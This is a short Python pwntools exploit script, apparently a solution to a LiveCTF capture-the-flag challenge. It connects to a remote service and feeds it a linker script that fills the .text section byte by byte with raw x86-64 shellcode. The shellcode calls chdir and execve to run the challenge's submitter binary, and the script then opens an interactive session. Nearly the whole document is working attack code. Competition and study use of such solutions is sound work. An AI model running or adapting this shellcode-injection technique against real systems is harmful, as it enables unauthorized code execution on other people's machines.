import argparse
from pwn import *

context.log_level = 'debug'

parser = argparse.ArgumentParser()
parser.add_argument("address", default="127.0.0.1:8000",
                    help="Address of challenge")


args = parser.parse_args()

HOST, PORT = args.address.split(':')

r = remote(HOST, int(PORT))

# chdir("/home/livectf")
# execve("/home/livectf/submitter", NULL, NULL)
shellcode = b"""H\xb8vectf\x00\x00\x00PH\xb8/home/liPH\x89\xe7H\xc7\xc0P\x00\x00\x00\x0f\x05H\xb8bmitter\x00PH\xb8vectf/suPH\xb8/home/liPH\x89\xe7H1\xf6H1\xd2H\xc7\xc0;\x00\x00\x00\x0f\x05"""

# Extremely simple linker script just replaces the entire .text segment with some bytes
# that are in the code above
r.sendline(b"""
start = 0;
ENTRY(start);
SECTIONS {
    . = 0;
    .text . : {
""".strip())
for b in shellcode:
    r.sendline(f"BYTE(0x{b:02x})")

r.sendline(b"""
        . = ALIGN(4);
    }
    # LD needs this or it gets mad
    .gnu.version    : { *(.gnu.version) }
    .gnu.version_d  : { *(.gnu.version_d) }
    .gnu.version_r  : { *(.gnu.version_r) }
    # Ignore everything else so we just get the segment that matters
    /DISCARD/ : { *(.*) }
}""".strip())

# Go!!
r.sendline(b"")

r.interactive()